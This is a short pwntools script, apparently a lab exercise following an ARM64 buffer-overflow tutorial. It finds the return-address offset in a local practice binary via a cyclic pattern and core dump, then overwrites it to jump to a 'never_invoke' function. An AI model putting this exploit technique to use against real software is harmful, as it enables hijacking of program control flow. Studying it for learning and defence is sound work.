#!/usr/bin/env python

'''
Refer to the following webpage:
https://lnxblog.github.io/2021/05/10/arm64-bof.html 
'''
from pwn import *

binary_path = "./vuln_arm64"

def find_rip_offset(io):
    io.clean()
    io.sendline(cyclic(0x50))
    io.wait()
    core = io.corefile
    #print(dir(core))
    stack = core.sp
    info("sp = %#x", stack)
    pattern = core.read(stack, 8)
    info("cyclic pattern = %s", pattern.decode())
    rip_offset = cyclic_find(pattern)
    info("rip offset is = %d", rip_offset)
    # aarch64 ret does not manipulate stack
    return rip_offset-8

def print_lines(io):
    info("printing io received lines")
    while True:
        try:
            line = io.recvline()
            success(line.decode())
        except EOFError:
            break

elf = ELF(binary_path)
# invoke vulnerable binary and find rip offset
p = process(elf.path)
offset = find_rip_offset(p)
padding = b"A" * offset
print(padding)
info("never_invoke %#x", elf.symbols.never_invoke)
retaddr = p64(elf.symbols.never_invoke)
payload = b"".join([padding, retaddr])
p = process(elf.path)
p.sendline(payload)
print_lines(p)
